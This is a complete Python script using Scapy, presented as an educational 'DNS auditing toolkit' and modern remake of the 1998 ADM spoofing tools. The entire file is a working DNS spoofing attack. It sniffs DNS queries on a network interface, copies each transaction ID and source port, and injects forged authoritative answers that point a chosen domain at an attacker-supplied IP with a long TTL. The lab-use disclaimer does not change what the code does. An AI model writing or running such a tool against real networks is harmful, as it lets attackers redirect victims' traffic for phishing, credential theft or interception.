#!/usr/bin/env python3
"""
Modern DNS Auditing Toolkit (Educational / Lab Use Only)
--------------------------------------------------------
This script is a modern equivalent of the 1998 ADM DNS spoofing tools.
Instead of manually calculating IP/UDP checksums in C, we use Python and Scapy
to dynamically parse, inject, and analyze DNS packets.

WARNING: Only use this on a local, isolated lab network where you have
explicit permission to intercept and modify traffic.

Requirements:
    pip install scapy
"""

from scapy.all import sniff, send, IP, UDP, DNS, DNSRR
import sys
import argparse

def craft_spoofed_response(pkt, spoofed_ip):
    """
    Dynamically crafts a spoofed DNS response based on the intercepted query.
    This demonstrates how the Transaction ID (pkt[DNS].id) and Source Port (pkt[UDP].sport)
    are critical to matching the response to the original query.
    """
    # 1. Swap the IP Source and Destination
    spoofed_ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    
    # 2. Swap the UDP Ports (The response must go back to the random source port!)
    spoofed_udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
    
    # 3. Craft the DNS Answer
    # We copy the original Transaction ID so the victim accepts our answer
    spoofed_dns_layer = DNS(
        id=pkt[DNS].id,         # Transaction ID mapping
        qr=1,                   # QR=1 indicates a response
        aa=1,                   # Authoritative Answer
        qd=pkt[DNS].qd,         # Replay the original question
        an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=86400, rdata=spoofed_ip) # Inject spoofed IP
    )
    
    return spoofed_ip_layer / spoofed_udp_layer / spoofed_dns_layer

def dns_sniffer_callback(pkt, target_domain, spoofed_ip):
    """
    Callback function executed for every intercepted packet.
    """
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0: # Is it a DNS query?
        query_name = pkt[DNS].qd.qname.decode('utf-8')
        
        # Check if the query matches our target domain
        if target_domain in query_name:
            print(f"[!] Intercepted DNS Query for {query_name} from {pkt[IP].src}")
            print(f"    Transaction ID: {pkt[DNS].id}")
            print(f"    Source Port: {pkt[UDP].sport}")
            
            # Craft and inject the spoofed response
            spoofed_pkt = craft_spoofed_response(pkt, spoofed_ip)
            send(spoofed_pkt, verbose=0)
            
            print(f"[+] Spoofed response sent: {query_name} -> {spoofed_ip}")

def main():
    parser = argparse.ArgumentParser(description="Modern DNS Auditing Toolkit (Educational)")
    parser.add_argument("-i", "--interface", help="Network interface to sniff on (e.g., eth0)")
    parser.add_argument("-d", "--domain", required=True, help="Target domain to spoof (e.g., example.com)")
    parser.add_argument("-ip", "--spoofed_ip", required=True, help="The IP address to inject (e.g., 10.0.0.99)")
    
    args = parser.parse_args()
    
    print(f"[*] Starting Modern DNS Auditor...")
    print(f"[*] Sniffing for queries to '{args.domain}' on {args.interface or 'default interface'}...")
    print(f"[*] Injecting IP: {args.spoofed_ip}")
    print(f"[*] Press Ctrl+C to stop.")
    
    # Start the Scapy sniffer using a BPF filter to only capture UDP port 53 (DNS)
    try:
        sniff(
            iface=args.interface,
            filter="udp port 53",
            prn=lambda pkt: dns_sniffer_callback(pkt, args.domain, args.spoofed_ip),
            store=0
        )
    except KeyboardInterrupt:
        print("\n[*] Shutting down auditor.")
        sys.exit(0)

if __name__ == "__main__":
    main()
